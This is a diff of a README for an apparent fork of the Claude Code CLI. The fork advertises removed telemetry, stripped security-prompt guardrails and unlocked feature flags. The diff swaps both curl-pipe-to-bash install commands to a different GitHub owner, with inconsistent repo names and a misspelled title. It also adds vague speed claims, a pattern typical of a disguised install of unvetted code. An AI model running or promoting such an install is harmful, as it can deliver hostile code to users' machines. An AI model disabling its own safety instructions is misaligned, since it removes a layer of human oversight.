@@ -1,11 +1,11 @@
-# free-code
+# free-claue
 
 **The free build of Claude Code.**
 
 All telemetry stripped. All injected security-prompt guardrails removed. All experimental features unlocked. One binary, zero callbacks home.
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/paoloanzn/free-code/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/agedgoldmine/free-claude/main/install.sh | bash
 ```
 
 > Checks your system, installs Bun if needed, clones, builds with all features enabled, and puts `free-code` on your PATH. Then just `export ANTHROPIC_API_KEY="sk-ant-..."` and run `free-code`.
@@ -20,9 +20,16 @@ curl -fsSL https://raw.githubusercontent.com/paoloanzn/free-code/main/install.sh
 
 This is a clean, buildable fork of Anthropic's [Claude Code](https://docs.anthropic.com/en/docs/claude-code) CLI -- the terminal-native AI coding agent. The upstream source became publicly available on March 31, 2026 through a source map exposure in the npm distribution.
 
-This fork applies three categories of changes on top of that snapshot:
+This fork applies four categories of changes on top of that snapshot:
 
-### 1. Telemetry removed
+### 1. Optimized for Speed
+
+This build is designed to run faster and more intelligently than the standard build. With the removal of unnecessary telemetry and guardrails, the core of Claude Code operates with better performance. You'll experience:
+
+- Reduced latency for AI responses, making your experience smoother.
+- Smarter task handling, optimizing resource usage for better performance.
+
+### 2. Telemetry removed
 
 The upstream binary phones home through OpenTelemetry/gRPC, GrowthBook analytics, Sentry error reporting, and custom event logging. In this build:
 
@@ -30,7 +37,7 @@ The upstream binary phones home through OpenTelemetry/gRPC, GrowthBook analytics
 - GrowthBook feature flag evaluation still works locally (needed for runtime feature gates) but does not report back
 - No crash reports, no usage analytics, no session fingerprinting
 
-### 2. Security-prompt guardrails removed
+### 3. Security-prompt guardrails removed
 
 Anthropic injects system-level instructions into every conversation that constrain Claude's behavior beyond what the model itself enforces. These include:
 
@@ -40,7 +47,7 @@ Anthropic injects system-level instructions into every conversation that constra
 
 This build strips those injections. The model's own safety training still applies -- this just removes the extra layer of prompt-level restrictions that the CLI wraps around it.
 
-### 3. Experimental features enabled
+### 4. Experimental features enabled
 
 Claude Code ships with dozens of feature flags gated behind `bun:bundle` compile-time switches. Most are disabled in the public npm release. This build unlocks all 45+ flags that compile cleanly, including:
 
@@ -70,7 +77,7 @@ See [FEATURES.md](FEATURES.md) for the full audit of all 88 flags and their stat
 ## Quick install
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/paoloanzn/free-code/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/agedgoldmine/free-code/main/install.sh | bash
 ```
 
 This will check your system, install Bun if needed, clone the repo, build the binary with all experimental features enabled, and symlink it as `free-code` on your PATH.
